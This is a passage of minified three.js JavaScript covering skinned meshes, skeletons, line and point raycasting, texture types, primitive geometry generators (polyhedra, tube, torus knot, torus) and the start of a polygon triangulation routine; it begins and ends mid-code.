n=1,r=t.length;n<r&&i>=t[n].distance;n++)t[n-1].object.visible=!1,t[n].object.visible=!0;for(;n<r;n++)t[n].object.visible=!1}},toJSON:function(e){var t=K.prototype.toJSON.call(this,e);t.object.levels=[];for(var i=this.levels,n=0,r=i.length;n<r;n++){var o=i[n];t.object.levels.push({object:o.object.uuid,distance:o.distance})}return t}}),Or.prototype=Object.assign(Object.create(Lt.prototype),{constructor:Or,isSkinnedMesh:!0,bind:function(e,t){this.skeleton=e,void 0===t&&(this.updateMatrixWorld(!0),this.skeleton.calculateInverses(),t=this.matrixWorld),this.bindMatrix.copy(t),this.bindMatrixInverse.getInverse(t)},pose:function(){this.skeleton.pose()},normalizeSkinWeights:function(){for(var e=new T,t=this.geometry.attributes.skinWeight,i=0,n=t.count;i<n;i++){e.x=t.getX(i),e.y=t.getY(i),e.z=t.getZ(i),e.w=t.getW(i);var r=1/e.manhattanLength();r!==1/0?e.multiplyScalar(r):e.set(1,0,0,0),t.setXYZW(i,e.x,e.y,e.z,e.w)}},updateMatrixWorld:function(e){Lt.prototype.updateMatrixWorld.call(this,e),"attached"===this.bindMode?this.bindMatrixInverse.getInverse(this.matrixWorld):"detached"===this.bindMode?this.bindMatrixInverse.getInverse(this.bindMatrix):console.warn("THREE.SkinnedMesh: Unrecognized bindMode: "+this.bindMode)},clone:function(){return new this.constructor(this.geometry,this.material).copy(this)}});var Ir=new B,Br=new B;function Dr(e,t){if(e=e||[],this.bones=e.slice(0),this.boneMatrices=new Float32Array(16*this.bones.length),this.frame=-1,void 0===t)this.calculateInverses();else if(this.bones.length===t.length)this.boneInverses=t.slice(0);else{console.warn("THREE.Skeleton boneInverses is the wrong length."),this.boneInverses=[];for(var i=0,n=this.bones.length;i<n;i++)this.boneInverses.push(new B)}}function zr(){K.call(this),this.type="Bone"}function Fr(e,t,i){Lt.call(this,e,t),this.instanceMatrix=new Xe(new Float32Array(16*i),16),this.count=i}function Nr(e){We.call(this),this.type="LineBasicMaterial",this.color=new Ne(16777215),this.linewidth=1,this.linecap="round",this.linejoin="round",this.setValues(e)}Object.assign(Dr.prototype,{calculateInverses:function(){this.boneInverses=[];for(var e=0,t=this.bones.length;e<t;e++){var i=new B;this.bones[e]&&i.getInverse(this.bones[e].matrixWorld),this.boneInverses.push(i)}},pose:function(){var e,t,i;for(t=0,i=this.bones.length;t<i;t++)(e=this.bones[t])&&e.matrixWorld.getInverse(this.boneInverses[t]);for(t=0,i=this.bones.length;t<i;t++)(e=this.bones[t])&&(e.parent&&e.parent.isBone?(e.matrix.getInverse(e.parent.matrixWorld),e.matrix.multiply(e.matrixWorld)):e.matrix.copy(e.matrixWorld),e.matrix.decompose(e.position,e.quaternion,e.scale))},update:function(){for(var e=this.bones,t=this.boneInverses,i=this.boneMatrices,n=this.boneTexture,r=0,o=e.length;r<o;r++){var a=e[r]?e[r].matrixWorld:Br;Ir.multiplyMatrices(a,t[r]),Ir.toArray(i,16*r)}void 0!==n&&(n.needsUpdate=!0)},clone:function(){return new Dr(this.bones,this.boneInverses)},getBoneByName:function(e){for(var t=0,i=this.bones.length;t<i;t++){var n=this.bones[t];if(n.name===e)return n}}}),zr.prototype=Object.assign(Object.create(K.prototype),{constructor:zr,isBone:!0}),Fr.prototype=Object.assign(Object.create(Lt.prototype),{constructor:Fr,isInstancedMesh:!0,raycast:function(){},setMatrixAt:function(e,t){t.toArray(this.instanceMatrix.array,16*e)},updateMorphTargets:function(){}}),Nr.prototype=Object.create(We.prototype),Nr.prototype.constructor=Nr,Nr.prototype.isLineBasicMaterial=!0,Nr.prototype.copy=function(e){return We.prototype.copy.call(this,e),this.color.copy(e.color),this.linewidth=e.linewidth,this.linecap=e.linecap,this.linejoin=e.linejoin,this};var jr=new y,Ur=new y,Vr=new B,Hr=new Se,Gr=new ve;function Wr(e,t,i){1===i&&console.error("THREE.Line: parameter THREE.LinePieces no longer supported. Use THREE.LineSegments instead."),K.call(this),this.type="Line",this.geometry=void 0!==e?e:new dt,this.material=void 0!==t?t:new Nr({color:16777215*Math.random()})}Wr.prototype=Object.assign(Object.create(K.prototype),{constructor:Wr,isLine:!0,computeLineDistances:function(){var e=this.geometry;if(e.isBufferGeometry)if(null===e.index){for(var t=e.attributes.position,i=[0],n=1,r=t.count;n<r;n++)jr.fromBufferAttribute(t,n-1),Ur.fromBufferAttribute(t,n),i[n]=i[n-1],i[n]+=jr.distanceTo(Ur);e.addAttribute("lineDistance",new tt(i,1))}else console.warn("THREE.Line.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");else if(e.isGeometry){var o=e.vertices;(i=e.lineDistances)[0]=0;for(n=1,r=o.length;n<r;n++)i[n]=i[n-1],i[n]+=o[n-1].distanceTo(o[n])}return this},raycast:function(e,t){var i=e.linePrecision,n=this.geometry,r=this.matrixWorld;if(null===n.boundingSphere&&n.computeBoundingSphere(),Gr.copy(n.boundingSphere),Gr.applyMatrix4(r),Gr.radius+=i,!1!==e.ray.intersectsSphere(Gr)){Vr.getInverse(r),Hr.copy(e.ray).applyMatrix4(Vr);var o=i/((this.scale.x+this.scale.y+this.scale.z)/3),a=o*o,s=new y,c=new y,l=new y,h=new y,u=this&&this.isLineSegments?2:1;if(n.isBufferGeometry){var d=n.index,p=n.attributes.position.array;if(null!==d)for(var f=d.array,m=0,v=f.length-1;m<v;m+=u){var g=f[m],b=f[m+1];if(s.fromArray(p,3*g),c.fromArray(p,3*b),!(Hr.distanceSqToSegment(s,c,h,l)>a))h.applyMatrix4(this.matrixWorld),(_=e.ray.origin.distanceTo(h))<e.near||_>e.far||t.push({distance:_,point:l.clone().applyMatrix4(this.matrixWorld),index:m,face:null,faceIndex:null,object:this})}else for(m=0,v=p.length/3-1;m<v;m+=u){if(s.fromArray(p,3*m),c.fromArray(p,3*m+3),!(Hr.distanceSqToSegment(s,c,h,l)>a))h.applyMatrix4(this.matrixWorld),(_=e.ray.origin.distanceTo(h))<e.near||_>e.far||t.push({distance:_,point:l.clone().applyMatrix4(this.matrixWorld),index:m,face:null,faceIndex:null,object:this})}}else if(n.isGeometry){var w=n.vertices,x=w.length;for(m=0;m<x-1;m+=u){var _;if(!(Hr.distanceSqToSegment(w[m],w[m+1],h,l)>a))h.applyMatrix4(this.matrixWorld),(_=e.ray.origin.distanceTo(h))<e.near||_>e.far||t.push({distance:_,point:l.clone().applyMatrix4(this.matrixWorld),index:m,face:null,faceIndex:null,object:this})}}}},clone:function(){return new this.constructor(this.geometry,this.material).copy(this)}});var qr=new y,Xr=new y;function Yr(e,t){Wr.call(this,e,t),this.type="LineSegments"}function Zr(e,t){Wr.call(this,e,t),this.type="LineLoop"}function Qr(e){We.call(this),this.type="PointsMaterial",this.color=new Ne(16777215),this.map=null,this.alphaMap=null,this.size=1,this.sizeAttenuation=!0,this.morphTargets=!1,this.setValues(e)}Yr.prototype=Object.assign(Object.create(Wr.prototype),{constructor:Yr,isLineSegments:!0,computeLineDistances:function(){var e=this.geometry;if(e.isBufferGeometry)if(null===e.index){for(var t=e.attributes.position,i=[],n=0,r=t.count;n<r;n+=2)qr.fromBufferAttribute(t,n),Xr.fromBufferAttribute(t,n+1),i[n]=0===n?0:i[n-1],i[n+1]=i[n]+qr.distanceTo(Xr);e.addAttribute("lineDistance",new tt(i,1))}else console.warn("THREE.LineSegments.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");else if(e.isGeometry){var o=e.vertices;for(i=e.lineDistances,n=0,r=o.length;n<r;n+=2)qr.copy(o[n]),Xr.copy(o[n+1]),i[n]=0===n?0:i[n-1],i[n+1]=i[n]+qr.distanceTo(Xr)}return this}}),Zr.prototype=Object.assign(Object.create(Wr.prototype),{constructor:Zr,isLineLoop:!0}),Qr.prototype=Object.create(We.prototype),Qr.prototype.constructor=Qr,Qr.prototype.isPointsMaterial=!0,Qr.prototype.copy=function(e){return We.prototype.copy.call(this,e),this.color.copy(e.color),this.map=e.map,this.alphaMap=e.alphaMap,this.size=e.size,this.sizeAttenuation=e.sizeAttenuation,this.morphTargets=e.morphTargets,this};var $r=new B,Jr=new Se,Kr=new ve,eo=new y;function to(e,t){K.call(this),this.type="Points",this.geometry=void 0!==e?e:new dt,this.material=void 0!==t?t:new Qr({color:16777215*Math.random()}),this.updateMorphTargets()}function io(e,t,i,n,r,o,a){var s=Jr.distanceSqToPoint(e);if(s<i){var c=new y;Jr.closestPointToPoint(e,c),c.applyMatrix4(n);var l=r.ray.origin.distanceTo(c);if(l<r.near||l>r.far)return;o.push({distance:l,distanceToRay:Math.sqrt(s),point:c,index:t,face:null,object:a})}}function no(e,t,i,n,r,o,a,s,c){S.call(this,e,t,i,n,r,o,a,s,c),this.format=void 0!==a?a:1022,this.minFilter=void 0!==o?o:1006,this.magFilter=void 0!==r?r:1006,this.generateMipmaps=!1}function ro(e,t,i,n,r,o,a,s,c,l,h,u){S.call(this,null,o,a,s,c,l,n,r,h,u),this.image={width:t,height:i},this.mipmaps=e,this.flipY=!1,this.generateMipmaps=!1}function oo(e,t,i,n,r,o,a,s,c){S.call(this,e,t,i,n,r,o,a,s,c),this.needsUpdate=!0}function ao(e,t,i,n,r,o,a,s,c,l){if(1026!==(l=void 0!==l?l:1026)&&1027!==l)throw new Error("DepthTexture format must be either THREE.DepthFormat or THREE.DepthStencilFormat");void 0===i&&1026===l&&(i=1012),void 0===i&&1027===l&&(i=1020),S.call(this,null,n,r,o,a,s,l,i,c),this.image={width:e,height:t},this.magFilter=void 0!==a?a:1003,this.minFilter=void 0!==s?s:1003,this.flipY=!1,this.generateMipmaps=!1}function so(e){dt.call(this),this.type="WireframeGeometry";var t,i,n,r,o,a,s,c,l,h,u=[],d=[0,0],p={},f=["a","b","c"];if(e&&e.isGeometry){var m=e.faces;for(t=0,n=m.length;t<n;t++){var v=m[t];for(i=0;i<3;i++)s=v[f[i]],c=v[f[(i+1)%3]],d[0]=Math.min(s,c),d[1]=Math.max(s,c),void 0===p[l=d[0]+","+d[1]]&&(p[l]={index1:d[0],index2:d[1]})}for(l in p)a=p[l],h=e.vertices[a.index1],u.push(h.x,h.y,h.z),h=e.vertices[a.index2],u.push(h.x,h.y,h.z)}else if(e&&e.isBufferGeometry){var g,b,w,x,_,M,S;if(h=new y,null!==e.index){for(g=e.attributes.position,b=e.index,0===(w=e.groups).length&&(w=[{start:0,count:b.count,materialIndex:0}]),r=0,o=w.length;r<o;++r)for(t=_=(x=w[r]).start,n=_+x.count;t<n;t+=3)for(i=0;i<3;i++)s=b.getX(t+i),c=b.getX(t+(i+1)%3),d[0]=Math.min(s,c),d[1]=Math.max(s,c),void 0===p[l=d[0]+","+d[1]]&&(p[l]={index1:d[0],index2:d[1]});for(l in p)a=p[l],h.fromBufferAttribute(g,a.index1),u.push(h.x,h.y,h.z),h.fromBufferAttribute(g,a.index2),u.push(h.x,h.y,h.z)}else for(t=0,n=(g=e.attributes.position).count/3;t<n;t++)for(i=0;i<3;i++)M=3*t+i,h.fromBufferAttribute(g,M),u.push(h.x,h.y,h.z),S=3*t+(i+1)%3,h.fromBufferAttribute(g,S),u.push(h.x,h.y,h.z)}this.addAttribute("position",new tt(u,3))}function co(e,t,i){zt.call(this),this.type="ParametricGeometry",this.parameters={func:e,slices:t,stacks:i},this.fromBufferGeometry(new lo(e,t,i)),this.mergeVertices()}function lo(e,t,i){dt.call(this),this.type="ParametricBufferGeometry",this.parameters={func:e,slices:t,stacks:i};var n,r,o=[],a=[],s=[],c=[],l=new y,h=new y,u=new y,d=new y,p=new y;e.length<3&&console.error("THREE.ParametricGeometry: Function must now modify a Vector3 as third parameter.");var f=t+1;for(n=0;n<=i;n++){var m=n/i;for(r=0;r<=t;r++){var v=r/t;e(v,m,h),a.push(h.x,h.y,h.z),v-1e-5>=0?(e(v-1e-5,m,u),d.subVectors(h,u)):(e(v+1e-5,m,u),d.subVectors(u,h)),m-1e-5>=0?(e(v,m-1e-5,u),p.subVectors(h,u)):(e(v,m+1e-5,u),p.subVectors(u,h)),l.crossVectors(d,p).normalize(),s.push(l.x,l.y,l.z),c.push(v,m)}}for(n=0;n<i;n++)for(r=0;r<t;r++){var g=n*f+r,b=n*f+r+1,w=(n+1)*f+r+1,x=(n+1)*f+r;o.push(g,b,x),o.push(b,w,x)}this.setIndex(o),this.addAttribute("position",new tt(a,3)),this.addAttribute("normal",new tt(s,3)),this.addAttribute("uv",new tt(c,2))}function ho(e,t,i,n){zt.call(this),this.type="PolyhedronGeometry",this.parameters={vertices:e,indices:t,radius:i,detail:n},this.fromBufferGeometry(new uo(e,t,i,n)),this.mergeVertices()}function uo(e,t,i,n){dt.call(this),this.type="PolyhedronBufferGeometry",this.parameters={vertices:e,indices:t,radius:i,detail:n},i=i||1;var r=[],o=[];function a(e,t,i,n){var r,o,a=Math.pow(2,n),c=[];for(r=0;r<=a;r++){c[r]=[];var l=e.clone().lerp(i,r/a),h=t.clone().lerp(i,r/a),u=a-r;for(o=0;o<=u;o++)c[r][o]=0===o&&r===a?l:l.clone().lerp(h,o/u)}for(r=0;r<a;r++)for(o=0;o<2*(a-r)-1;o++){var d=Math.floor(o/2);o%2==0?(s(c[r][d+1]),s(c[r+1][d]),s(c[r][d])):(s(c[r][d+1]),s(c[r+1][d+1]),s(c[r+1][d]))}}function s(e){r.push(e.x,e.y,e.z)}function c(t,i){var n=3*t;i.x=e[n+0],i.y=e[n+1],i.z=e[n+2]}function l(e,t,i,n){n<0&&1===e.x&&(o[t]=e.x-1),0===i.x&&0===i.z&&(o[t]=n/2/Math.PI+.5)}function h(e){return Math.atan2(e.z,-e.x)}!function(e){for(var i=new y,n=new y,r=new y,o=0;o<t.length;o+=3)c(t[o+0],i),c(t[o+1],n),c(t[o+2],r),a(i,n,r,e)}(n=n||0),function(e){for(var t=new y,i=0;i<r.length;i+=3)t.x=r[i+0],t.y=r[i+1],t.z=r[i+2],t.normalize().multiplyScalar(e),r[i+0]=t.x,r[i+1]=t.y,r[i+2]=t.z}(i),function(){for(var e=new y,t=0;t<r.length;t+=3){e.x=r[t+0],e.y=r[t+1],e.z=r[t+2];var i=h(e)/2/Math.PI+.5,n=(a=e,Math.atan2(-a.y,Math.sqrt(a.x*a.x+a.z*a.z))/Math.PI+.5);o.push(i,1-n)}var a;(function(){for(var e=new y,t=new y,i=new y,n=new y,a=new f,s=new f,c=new f,u=0,d=0;u<r.length;u+=9,d+=6){e.set(r[u+0],r[u+1],r[u+2]),t.set(r[u+3],r[u+4],r[u+5]),i.set(r[u+6],r[u+7],r[u+8]),a.set(o[d+0],o[d+1]),s.set(o[d+2],o[d+3]),c.set(o[d+4],o[d+5]),n.copy(e).add(t).add(i).divideScalar(3);var p=h(n);l(a,d+0,e,p),l(s,d+2,t,p),l(c,d+4,i,p)}})(),function(){for(var e=0;e<o.length;e+=6){var t=o[e+0],i=o[e+2],n=o[e+4],r=Math.max(t,i,n),a=Math.min(t,i,n);r>.9&&a<.1&&(t<.2&&(o[e+0]+=1),i<.2&&(o[e+2]+=1),n<.2&&(o[e+4]+=1))}}()}(),this.addAttribute("position",new tt(r,3)),this.addAttribute("normal",new tt(r.slice(),3)),this.addAttribute("uv",new tt(o,2)),0===n?this.computeVertexNormals():this.normalizeNormals()}function po(e,t){zt.call(this),this.type="TetrahedronGeometry",this.parameters={radius:e,detail:t},this.fromBufferGeometry(new fo(e,t)),this.mergeVertices()}function fo(e,t){uo.call(this,[1,1,1,-1,-1,1,-1,1,-1,1,-1,-1],[2,1,0,0,3,2,1,3,0,2,3,1],e,t),this.type="TetrahedronBufferGeometry",this.parameters={radius:e,detail:t}}function mo(e,t){zt.call(this),this.type="OctahedronGeometry",this.parameters={radius:e,detail:t},this.fromBufferGeometry(new vo(e,t)),this.mergeVertices()}function vo(e,t){uo.call(this,[1,0,0,-1,0,0,0,1,0,0,-1,0,0,0,1,0,0,-1],[0,2,4,0,4,3,0,3,5,0,5,2,1,2,5,1,5,3,1,3,4,1,4,2],e,t),this.type="OctahedronBufferGeometry",this.parameters={radius:e,detail:t}}function go(e,t){zt.call(this),this.type="IcosahedronGeometry",this.parameters={radius:e,detail:t},this.fromBufferGeometry(new yo(e,t)),this.mergeVertices()}function yo(e,t){var i=(1+Math.sqrt(5))/2,n=[-1,i,0,1,i,0,-1,-i,0,1,-i,0,0,-1,i,0,1,i,0,-1,-i,0,1,-i,i,0,-1,i,0,1,-i,0,-1,-i,0,1];uo.call(this,n,[0,11,5,0,5,1,0,1,7,0,7,10,0,10,11,1,5,9,5,11,4,11,10,2,10,7,6,7,1,8,3,9,4,3,4,2,3,2,6,3,6,8,3,8,9,4,9,5,2,4,11,6,2,10,8,6,7,9,8,1],e,t),this.type="IcosahedronBufferGeometry",this.parameters={radius:e,detail:t}}function bo(e,t){zt.call(this),this.type="DodecahedronGeometry",this.parameters={radius:e,detail:t},this.fromBufferGeometry(new wo(e,t)),this.mergeVertices()}function wo(e,t){var i=(1+Math.sqrt(5))/2,n=1/i,r=[-1,-1,-1,-1,-1,1,-1,1,-1,-1,1,1,1,-1,-1,1,-1,1,1,1,-1,1,1,1,0,-n,-i,0,-n,i,0,n,-i,0,n,i,-n,-i,0,-n,i,0,n,-i,0,n,i,0,-i,0,-n,i,0,-n,-i,0,n,i,0,n];uo.call(this,r,[3,11,7,3,7,15,3,15,13,7,19,17,7,17,6,7,6,15,17,4,8,17,8,10,17,10,6,8,0,16,8,16,2,8,2,10,0,12,1,0,1,18,0,18,16,6,10,2,6,2,13,6,13,15,2,16,18,2,18,3,2,3,13,18,1,9,18,9,11,18,11,3,4,14,12,4,12,0,4,0,8,11,9,5,11,5,19,11,19,7,19,5,14,19,14,4,19,4,17,1,12,14,1,14,5,1,5,9],e,t),this.type="DodecahedronBufferGeometry",this.parameters={radius:e,detail:t}}function xo(e,t,i,n,r,o){zt.call(this),this.type="TubeGeometry",this.parameters={path:e,tubularSegments:t,radius:i,radialSegments:n,closed:r},void 0!==o&&console.warn("THREE.TubeGeometry: taper has been removed.");var a=new _o(e,t,i,n,r);this.tangents=a.tangents,this.normals=a.normals,this.binormals=a.binormals,this.fromBufferGeometry(a),this.mergeVertices()}function _o(e,t,i,n,r){dt.call(this),this.type="TubeBufferGeometry",this.parameters={path:e,tubularSegments:t,radius:i,radialSegments:n,closed:r},t=t||64,i=i||1,n=n||8,r=r||!1;var o=e.computeFrenetFrames(t,r);this.tangents=o.tangents,this.normals=o.normals,this.binormals=o.binormals;var a,s,c=new y,l=new y,h=new f,u=new y,d=[],p=[],m=[],v=[];function g(r){u=e.getPointAt(r/t,u);var a=o.normals[r],h=o.binormals[r];for(s=0;s<=n;s++){var f=s/n*Math.PI*2,m=Math.sin(f),v=-Math.cos(f);l.x=v*a.x+m*h.x,l.y=v*a.y+m*h.y,l.z=v*a.z+m*h.z,l.normalize(),p.push(l.x,l.y,l.z),c.x=u.x+i*l.x,c.y=u.y+i*l.y,c.z=u.z+i*l.z,d.push(c.x,c.y,c.z)}}!function(){for(a=0;a<t;a++)g(a);g(!1===r?t:0),function(){for(a=0;a<=t;a++)for(s=0;s<=n;s++)h.x=a/t,h.y=s/n,m.push(h.x,h.y)}(),function(){for(s=1;s<=t;s++)for(a=1;a<=n;a++){var e=(n+1)*(s-1)+(a-1),i=(n+1)*s+(a-1),r=(n+1)*s+a,o=(n+1)*(s-1)+a;v.push(e,i,o),v.push(i,r,o)}}()}(),this.setIndex(v),this.addAttribute("position",new tt(d,3)),this.addAttribute("normal",new tt(p,3)),this.addAttribute("uv",new tt(m,2))}function Mo(e,t,i,n,r,o,a){zt.call(this),this.type="TorusKnotGeometry",this.parameters={radius:e,tube:t,tubularSegments:i,radialSegments:n,p:r,q:o},void 0!==a&&console.warn("THREE.TorusKnotGeometry: heightScale has been deprecated. Use .scale( x, y, z ) instead."),this.fromBufferGeometry(new So(e,t,i,n,r,o)),this.mergeVertices()}function So(e,t,i,n,r,o){dt.call(this),this.type="TorusKnotBufferGeometry",this.parameters={radius:e,tube:t,tubularSegments:i,radialSegments:n,p:r,q:o},e=e||1,t=t||.4,i=Math.floor(i)||64,n=Math.floor(n)||8,r=r||2,o=o||3;var a,s,c=[],l=[],h=[],u=[],d=new y,p=new y,f=new y,m=new y,v=new y,g=new y,b=new y;for(a=0;a<=i;++a){var w=a/i*r*Math.PI*2;for(C(w,r,o,e,f),C(w+.01,r,o,e,m),g.subVectors(m,f),b.addVectors(m,f),v.crossVectors(g,b),b.crossVectors(v,g),v.normalize(),b.normalize(),s=0;s<=n;++s){var x=s/n*Math.PI*2,_=-t*Math.cos(x),M=t*Math.sin(x);d.x=f.x+(_*b.x+M*v.x),d.y=f.y+(_*b.y+M*v.y),d.z=f.z+(_*b.z+M*v.z),l.push(d.x,d.y,d.z),p.subVectors(d,f).normalize(),h.push(p.x,p.y,p.z),u.push(a/i),u.push(s/n)}}for(s=1;s<=i;s++)for(a=1;a<=n;a++){var S=(n+1)*(s-1)+(a-1),T=(n+1)*s+(a-1),E=(n+1)*s+a,A=(n+1)*(s-1)+a;c.push(S,T,A),c.push(T,E,A)}function C(e,t,i,n,r){var o=Math.cos(e),a=Math.sin(e),s=i/t*e,c=Math.cos(s);r.x=n*(2+c)*.5*o,r.y=n*(2+c)*a*.5,r.z=n*Math.sin(s)*.5}this.setIndex(c),this.addAttribute("position",new tt(l,3)),this.addAttribute("normal",new tt(h,3)),this.addAttribute("uv",new tt(u,2))}function To(e,t,i,n,r){zt.call(this),this.type="TorusGeometry",this.parameters={radius:e,tube:t,radialSegments:i,tubularSegments:n,arc:r},this.fromBufferGeometry(new Eo(e,t,i,n,r)),this.mergeVertices()}function Eo(e,t,i,n,r){dt.call(this),this.type="TorusBufferGeometry",this.parameters={radius:e,tube:t,radialSegments:i,tubularSegments:n,arc:r},e=e||1,t=t||.4,i=Math.floor(i)||8,n=Math.floor(n)||6,r=r||2*Math.PI;var o,a,s=[],c=[],l=[],h=[],u=new y,d=new y,p=new y;for(o=0;o<=i;o++)for(a=0;a<=n;a++){var f=a/n*r,m=o/i*Math.PI*2;d.x=(e+t*Math.cos(m))*Math.cos(f),d.y=(e+t*Math.cos(m))*Math.sin(f),d.z=t*Math.sin(m),c.push(d.x,d.y,d.z),u.x=e*Math.cos(f),u.y=e*Math.sin(f),p.subVectors(d,u).normalize(),l.push(p.x,p.y,p.z),h.push(a/n),h.push(o/i)}for(o=1;o<=i;o++)for(a=1;a<=n;a++){var v=(n+1)*o+a-1,g=(n+1)*(o-1)+a-1,b=(n+1)*(o-1)+a,w=(n+1)*o+a;s.push(v,g,w),s.push(g,b,w)}this.setIndex(s),this.addAttribute("position",new tt(c,3)),this.addAttribute("normal",new tt(l,3)),this.addAttribute("uv",new tt(h,2))}to.prototype=Object.assign(Object.create(K.prototype),{constructor:to,isPoints:!0,raycast:function(e,t){var i=this.geometry,n=this.matrixWorld,r=e.params.Points.threshold;if(null===i.boundingSphere&&i.computeBoundingSphere(),Kr.copy(i.boundingSphere),Kr.applyMatrix4(n),Kr.radius+=r,!1!==e.ray.intersectsSphere(Kr)){$r.getInverse(n),Jr.copy(e.ray).applyMatrix4($r);var o=r/((this.scale.x+this.scale.y+this.scale.z)/3),a=o*o;if(i.isBufferGeometry){var s=i.index,c=i.attributes.position.array;if(null!==s)for(var l=s.array,h=0,u=l.length;h<u;h++){var d=l[h];eo.fromArray(c,3*d),io(eo,d,a,n,e,t,this)}else{h=0;for(var p=c.length/3;h<p;h++)eo.fromArray(c,3*h),io(eo,h,a,n,e,t,this)}}else{var f=i.vertices;for(h=0,p=f.length;h<p;h++)io(f[h],h,a,n,e,t,this)}}},updateMorphTargets:function(){var e,t,i,n=this.geometry;if(n.isBufferGeometry){var r=n.morphAttributes,o=Object.keys(r);if(o.length>0){var a=r[o[0]];if(void 0!==a)for(this.morphTargetInfluences=[],this.morphTargetDictionary={},e=0,t=a.length;e<t;e++)i=a[e].name||String(e),this.morphTargetInfluences.push(0),this.morphTargetDictionary[i]=e}}else{var s=n.morphTargets;void 0!==s&&s.length>0&&console.error("THREE.Points.updateMorphTargets() does not support THREE.Geometry. Use THREE.BufferGeometry instead.")}},clone:function(){return new this.constructor(this.geometry,this.material).copy(this)}}),no.prototype=Object.assign(Object.create(S.prototype),{constructor:no,isVideoTexture:!0,update:function(){var e=this.image;e.readyState>=e.HAVE_CURRENT_DATA&&(this.needsUpdate=!0)}}),ro.prototype=Object.create(S.prototype),ro.prototype.constructor=ro,ro.prototype.isCompressedTexture=!0,oo.prototype=Object.create(S.prototype),oo.prototype.constructor=oo,oo.prototype.isCanvasTexture=!0,ao.prototype=Object.create(S.prototype),ao.prototype.constructor=ao,ao.prototype.isDepthTexture=!0,so.prototype=Object.create(dt.prototype),so.prototype.constructor=so,co.prototype=Object.create(zt.prototype),co.prototype.constructor=co,co.prototype.toJSON=function(){var e=zt.prototype.toJSON.call(this);return e.func=this.parameters.func.toString(),e},lo.prototype=Object.create(dt.prototype),lo.prototype.constructor=lo,lo.prototype.toJSON=function(){var e=dt.prototype.toJSON.call(this);return e.func=this.parameters.func.toString(),e},ho.prototype=Object.create(zt.prototype),ho.prototype.constructor=ho,uo.prototype=Object.create(dt.prototype),uo.prototype.constructor=uo,po.prototype=Object.create(zt.prototype),po.prototype.constructor=po,fo.prototype=Object.create(uo.prototype),fo.prototype.constructor=fo,mo.prototype=Object.create(zt.prototype),mo.prototype.constructor=mo,vo.prototype=Object.create(uo.prototype),vo.prototype.constructor=vo,go.prototype=Object.create(zt.prototype),go.prototype.constructor=go,yo.prototype=Object.create(uo.prototype),yo.prototype.constructor=yo,bo.prototype=Object.create(zt.prototype),bo.prototype.constructor=bo,wo.prototype=Object.create(uo.prototype),wo.prototype.constructor=wo,xo.prototype=Object.create(zt.prototype),xo.prototype.constructor=xo,_o.prototype=Object.create(dt.prototype),_o.prototype.constructor=_o,_o.prototype.toJSON=function(){var e=dt.prototype.toJSON.call(this);return e.path=this.parameters.path.toJSON(),e},Mo.prototype=Object.create(zt.prototype),Mo.prototype.constructor=Mo,So.prototype=Object.create(dt.prototype),So.prototype.constructor=So,To.prototype=Object.create(zt.prototype),To.prototype.constructor=To,Eo.prototype=Object.create(dt.prototype),Eo.prototype.constructor=Eo;var Ao=function(e,t,i){i=i||2;var n,r,o,a,s,c,l,h=t&&t.length,u=h?t[0]*i:e.length,d=Co(e,0,u,i,!0),p=[];if(!d||d.next===d.prev)return p;if(h&&(d=function(e,t,i,n){var r,o,a,s,c,l=[];for(r=0,o=t.length;r<o;r++)a=t[r]*n,s=r<o-1?t[r+1]*n:e.length,(c=Co(e,a,s,n,!1))===c.next&&(c.steiner=!0),l.push(Fo(c));for(l.sort(Bo),r=0;r<l.length;r++)Do(l[r],i),i=Po(i,i.next);return i}(e,t,d,i)),e.length>80*i){n=o=e[0],r=a=e[1];for(var f=i;f<u;f+=i)(s=e[f])<n&&(n=s),(c=e[f+1])<r&&(r=c),s>o&&(o=s),c>a&&(a=c);l=0!==(l=Math.max(o-n,a-r))?1/l:0}return Lo(d,p,i,n,r,l),p};function Co(e,t,i,n,r){var o,a;if(r===function(e,t,i,n){for(var r=0,o=t,a=i-n;o<i;o+=n)r+=(e[a]-e[o])*(e[o+1]+e[a+1]),a=o;return r}(e,t,i,n)>0)for(o=t;o<i;o+=n)a=qo(o,e[o],e[o+1],a);else for(o=i-n;o>=t;o-=n)a=qo(o,e[o],e[o+1],a);return a&&Vo(a,a.next)&&(Xo(a),a=a.next),a}function Po(e,t){if(!e)return e;t||(t=e);var i,n=e;do{if(i=!1,n.steiner||!Vo(n,n.next)&&0!==Uo(n.prev,n,n.next))n=n.next;else{if(Xo(n),(n=t=n.prev)===n.next)break;i=!0}}while(i||n!==t);return t}function Lo(e,t,i,n,r,o,a){if(e){!a&&o&&function(e,t,i,n){var r=e;do{null===r.z&&(r.z=zo(r.x,r.y,t,i,n)),r.prevZ=r.prev,r.nextZ=r.next,r=r.next}while(r!==e);r.prevZ.nextZ=null,r.prevZ=null,function(e){var t,i,n,r,o,a,s,c,l=1;do{for(i=e,e=null,o=null,a=0;i;){for(a++,n=i,s=0,t=0;t<l&&(s++,n=n.nextZ);t++);for(c=l;s>0||c>0&&n;)0!==s&&(0===c||!n||i.z<=n.z)?(r=i,i=i.nextZ,s--):(r=n,n=n.nextZ,c--),o?o.nextZ=r:e=r,r.prevZ=o,o=r;i=n}o.nextZ=null,l*=2}while(a>1)}(r)}(e,n,r,o);for(var s,c,l=e;e.prev!==e.next;)if(s=e.prev,c=e.next,o?ko(e,n,r,o):Ro(e))t.push(s.i/i),t.push(e.i/i),t.push(c.i/i),Xo(e),e=c.next,l=c.next;else if((e=c)===l){a?1===a?Lo(e=Oo(e,t,i),t,i,n,r,o,2):2===a&&Io(e,t,i,n,r,o):Lo(Po(e),t,i,n,r,o,1);break}}}function Ro(e){var t=e.prev,i=e,n=e.next;if(Uo(t,i,n)>=0)return!1;for(var r=e.next.next;r!==e.prev;){if(No(t.x,t.y,i.x,i.y,n.x,n.y,r.x,r.y)&&Uo(r.prev,r,r.next)>=0)return!1;r=r.next}return!0}function ko(e,t,i,n){var r=e.prev,o=e,a=e.next;if(Uo(r,o,a)>=0)return!1;for(var 